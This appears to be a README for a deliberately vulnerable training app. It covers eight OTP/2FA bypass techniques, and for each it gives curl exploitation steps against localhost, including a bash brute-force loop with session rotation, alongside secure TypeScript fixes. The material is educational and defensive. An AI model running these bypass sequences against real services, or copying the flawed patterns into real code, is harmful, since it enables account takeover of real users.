# Advanced OTP/2FA Bypass Vulnerabilities

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - Based on real HackerOne reports (2023-2024). For educational purposes only.

## Overview

Implemented **8 advanced OTP/2FA bypass techniques** based on actual disclosed HackerOne reports and security research. These demonstrate sophisticated authentication bypass methods that have been exploited in production systems.

---

## Vulnerabilities

### 1. Account Deactivation → Password Reset Bypass

**Severity**: Critical  
**Source**: HackerOne 2023-2024 Reports

**Vulnerability**: Deactivating an account then resetting the password allows login without 2FA prompt.

**Exploitation**:
```bash
# 1. Deactivate account
curl -X POST http://localhost:3000/api/additional-auth/deactivate-account \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# 2. Request password reset
curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# 3. Reset password with token
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","token":"<token>","newPassword":"hacked"}'

# 4. Login - 2FA bypassed!
curl -X POST http://localhost:3000/api/additional-auth/login-after-deactivation \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"hacked"}'
```

**Impact**: Complete 2FA bypass, account takeover.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    const user = await prisma.user.findUnique({ where: { email } });
    
    // Check if account is deactivated
    if (user.deactivated) {
        return res.status(403).json({ message: 'Account deactivated' });
    }
    
    // Always require 2FA if enabled, regardless of account state
    if (user.twoFactorEnabled) {
        return res.json({ requiresOTP: true });
    }
};
```

---

### 2. Reusable OTP (No Invalidation After Use)

**Severity**: Critical  
**Source**: HackerOne #2024 Microsoft Authenticator Report

**Vulnerability**: OTPs remain valid after successful use, allowing replay attacks.

**Exploitation**:
```bash
# 1. Intercept valid OTP during legitimate use
OTP="123456"

# 2. Use OTP to login
curl -X POST http://localhost:3000/api/additional-auth/verify-otp-reusable \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","otp":"123456"}'

# 3. Reuse same OTP later (replay attack)
curl -X POST http://localhost:3000/api/additional-auth/verify-otp-reusable \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","otp":"123456"}'
# Still works!
```

**Impact**: OTP replay attacks, persistent unauthorized access.

**Secure Implementation**:
```typescript
const usedOTPs: Set<string> = new Set();

export const verifyOTPSecure = async (req: Request, res: Response) => {
    const { email, otp } = req.body;
    
    // Check if OTP already used
    if (usedOTPs.has(otp)) {
        return res.status(400).json({ message: 'OTP already used' });
    }
    
    // Verify OTP
    if (user.otp === otp) {
        // Invalidate OTP immediately after use
        usedOTPs.add(otp);
        await prisma.user.update({
            where: { id: user.id },
            data: { otp: null }
        });
    }
};
```

---

### 3. Email OTP Bypass via Early Session Cookie

**Severity**: Critical  
**Source**: HackerOne #2024 Drugs.com Report

**Vulnerability**: Application generates session cookies before OTP verification completes.

**Exploitation**:
```bash
# 1. Login with password
curl -c cookies.txt -X POST http://localhost:3000/api/additional-auth/login-early-session-cookie \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"password123"}'

# Response includes session cookie BEFORE OTP verification!
# Set-Cookie: sessionId=SESSION-1234567890

# 2. Extract session ID and use directly
SESSION_ID=$(grep sessionId cookies.txt | awk '{print $7}')

# 3. Access protected resources without OTP
curl -b "sessionId=$SESSION_ID" \
  http://localhost:3000/api/jwt-session/session-data
# Authenticated without OTP!
```

**Impact**: Complete 2FA bypass, session hijacking.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    // Verify password
    if (!await bcrypt.compare(password, user.password)) {
        return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    // DON'T issue session cookie yet
    // Store temporary state server-side
    const tempToken = generateTempToken(user.id);
    
    res.json({
        requiresOTP: true,
        tempToken // Only issue full session after OTP verification
    });
};
```

---

### 4. 2FA Bypass via Cookie Deletion

**Severity**: Critical  
**Source**: HackerOne #2024 MFA Bypass Report

**Vulnerability**: MFA state stored in client-side cookie that can be deleted.

**Exploitation**:
```bash
# 1. Login triggers MFA
curl -c cookies.txt -X POST http://localhost:3000/api/additional-auth/login-mfa-cookie \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"password123"}'

# Cookies set: sessionId=xyz789; mfa_required=true

# 2. Delete mfa_required cookie, keep sessionId
# In browser: document.cookie = "mfa_required=; expires=Thu, 01 Jan 1970 00:00:00 UTC"

# 3. Access protected resource
curl -b "sessionId=xyz789" \
  http://localhost:3000/api/additional-auth/access-without-mfa
# MFA bypassed!
```

**Impact**: Complete MFA bypass by manipulating client-side state.

**Secure Implementation**:
```typescript
export const accessSecure = async (req: Request, res: Response) => {
    const sessionId = req.cookies.sessionId;
    const session = sessions[sessionId];
    
    // Store MFA state SERVER-SIDE, not in cookie
    if (session.mfaRequired && !session.mfaCompleted) {
        return res.status(403).json({ message: 'MFA required' });
    }
    
    // Grant access only if MFA completed server-side
    res.json({ message: 'Access granted' });
};
```

---

### 5. Expired TOTP Code Acceptance

**Severity**: High  
**Source**: HackerOne #2024 hackerone.com Report

**Vulnerability**: TOTP authenticator accepts codes older than the valid time window (>1 minute).

**Exploitation**:
```bash
# 1. Generate TOTP code at time T
TOTP="654321"
TIMESTAMP=$(date +%s)000

# 2. Wait 2 minutes (120 seconds)
sleep 120

# 3. Use expired TOTP
curl -X POST http://localhost:3000/api/additional-auth/verify-totp-expired \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"victim@test.com\",\"totp\":\"654321\",\"timestamp\":$TIMESTAMP}"
# Accepted despite being 2 minutes old!
```

**Impact**: Extended attack window, increased brute-force success rate.

**Secure Implementation**:
```typescript
export const verifyTOTPSecure = async (req: Request, res: Response) => {
    const { totp, timestamp } = req.body;
    
    // Strict time window validation (30 seconds)
    const now = Date.now();
    const age = now - timestamp;
    
    if (age > 30000) { // 30 seconds
        return res.status(400).json({ message: 'TOTP expired' });
    }
    
    // Verify TOTP
    if (user.otp === totp) {
        // Grant access
    }
};
```

---

### 6. Bypassing Phone Number OTP in Account Recovery

**Severity**: High  
**Source**: HackerOne #2024 Report

**Vulnerability**: Can add phone number for account recovery without SMS OTP verification.

**Exploitation**:
```bash
# 1. Add victim's phone number without verification
curl -X POST http://localhost:3000/api/additional-auth/add-recovery-phone \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","phoneNumber":"+1234567890"}'
# Success without SMS OTP!

# 2. Initiate account recovery using victim's phone
# Attacker can now receive recovery codes on victim's phone
```

**Impact**: Account takeover via recovery mechanism abuse.

**Secure Implementation**:
```typescript
export const addRecoveryPhoneSecure = async (req: Request, res: Response) => {
    const { phoneNumber } = req.body;
    
    // Generate SMS OTP
    const smsOTP = generateSMSOTP();
    await sendSMS(phoneNumber, smsOTP);
    
    // Store pending verification
    pendingPhoneVerifications[phoneNumber] = smsOTP;
    
    res.json({
        message: 'SMS OTP sent - verify to add phone',
        requiresVerification: true
    });
};
```

---

### 7. 2FA Race Condition (Multiple Reset Requests)

**Severity**: High  
**Source**: HackerOne #2024 2FA Reset Report

**Vulnerability**: Multiple parallel 2FA reset requests remain active even if one is canceled.

**Exploitation**:
```bash
# 1. Send multiple 2FA reset requests simultaneously
for i in {1..5}; do
  curl -X POST http://localhost:3000/api/additional-auth/request-2fa-reset \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com"}' &
done

# 5 reset tokens created

# 2. Victim cancels one request
curl -X POST http://localhost:3000/api/additional-auth/cancel-2fa-reset \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","resetToken":"token1"}'

# 3. Other 4 requests remain active for 24 hours!
# Attacker can complete one of them
```

**Impact**: 2FA removal, account takeover.

**Secure Implementation**:
```typescript
export const cancel2FAResetSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    
    // Invalidate ALL reset requests for this user
    delete twoFAResetRequests[email];
    
    res.json({
        message: 'All 2FA reset requests canceled',
        activeRequests: 0
    });
};
```

---

### 8. OTP Brute Force via Session ID Rotation

**Severity**: Critical  
**Source**: Security Research - Session ID Manipulation

**Vulnerability**: Rate limiting tied to session ID; unlimited session creation bypasses rate limit.

**Exploitation**:
```bash
# 1. Request OTP
curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# 2. Brute force with session rotation
for i in {0000..9999}; do
  # Get new session every 5 attempts
  if [ $((i % 5)) -eq 0 ]; then
    SESSION=$(curl -s http://localhost:3000/api/additional-auth/new-session | jq -r '.sessionId')
  fi
  
  # Try OTP
  curl -b "sessionId=$SESSION" \
    -X POST http://localhost:3000/api/additional-auth/verify-otp-session-limit \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@test.com\",\"otp\":\"$(printf "%04d" $i)\"}"
done

# Rate limit bypassed by rotating sessions!
```

**Impact**: OTP brute-force, account takeover.

**Secure Implementation**:
```typescript
const otpAttemptsByEmail: { [email: string]: number } = {};
const otpAttemptsByIP: { [ip: string]: number } = {};

export const verifyOTPSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    const ip = req.ip;
    
    // Rate limit by EMAIL (not session)
    if (otpAttemptsByEmail[email] >= 5) {
        return res.status(429).json({ message: 'Too many attempts' });
    }
    
    // Also rate limit by IP
    if (otpAttemptsByIP[ip] >= 20) {
        return res.status(429).json({ message: 'Too many attempts from IP' });
    }
    
    // Verify OTP
    if (user.otp !== otp) {
        otpAttemptsByEmail[email]++;
        otpAttemptsByIP[ip]++;
        return res.status(400).json({ message: 'Invalid OTP' });
    }
};
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/additional-auth/deactivate-account` | POST | Account deactivation bypass |
| `/api/additional-auth/login-after-deactivation` | POST | Login after deactivation |
| `/api/additional-auth/verify-otp-reusable` | POST | Reusable OTP |
| `/api/additional-auth/login-early-session-cookie` | POST | Early session cookie |
| `/api/additional-auth/login-mfa-cookie` | POST | MFA cookie bypass |
| `/api/additional-auth/access-without-mfa` | GET | Access without MFA |
| `/api/additional-auth/verify-totp-expired` | POST | Expired TOTP |
| `/api/additional-auth/add-recovery-phone` | POST | Phone number bypass |
| `/api/additional-auth/request-2fa-reset` | POST | 2FA race condition |
| `/api/additional-auth/cancel-2fa-reset` | POST | Cancel 2FA reset |
| `/api/additional-auth/new-session` | GET | New session creation |
| `/api/additional-auth/verify-otp-session-limit` | POST | Session-based rate limit |

---

## Testing Checklist

- [ ] Test account deactivation bypass
- [ ] Test OTP reuse with same code
- [ ] Test early session cookie bypass
- [ ] Test MFA cookie deletion
- [ ] Test expired TOTP acceptance
- [ ] Test phone number addition without SMS
- [ ] Test 2FA reset race condition
- [ ] Test OTP brute force with session rotation

---

## Secure Implementation Best Practices

1. **Account State Management**
   - Invalidate 2FA requirements on account state changes
   - Require re-authentication after deactivation/reactivation

2. **OTP Lifecycle**
   - Invalidate OTP immediately after successful use
   - Implement strict expiration times (5-10 minutes)
   - One-time use only - no replay attacks

3. **Session Management**
   - Never issue session cookies before 2FA completion
   - Store MFA state server-side, not in cookies
   - Regenerate session ID after 2FA completion

4. **TOTP Validation**
   - Enforce strict time windows (30 seconds)
   - Reject codes outside valid time range
   - Implement clock skew tolerance (±1 window)

5. **Rate Limiting**
   - Rate limit by email/user, not session
   - Implement global IP-based rate limiting
   - Limit session creation per IP
   - Use CAPTCHA after threshold

6. **Recovery Mechanisms**
   - Require verification for all recovery methods
   - SMS OTP for phone number addition
   - Email verification for email changes
   - Invalidate all recovery requests on cancel

---

## Real-World HackerOne Reports

- **Account Deactivation Bypass**: Multiple reports 2023-2024
- **Reusable OTP**: Microsoft Authenticator #2024
- **Early Session Cookie**: Drugs.com #2024
- **MFA Cookie Bypass**: #2024 MFA Bypass Report
- **Expired TOTP**: hackerone.com #2024
- **Phone Number Bypass**: #2024 Report
- **2FA Race Condition**: #2024 2FA Reset Report

---

## References

- [HackerOne Disclosed Reports](https://hackerone.com/hacktivity)
- [OWASP MFA Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
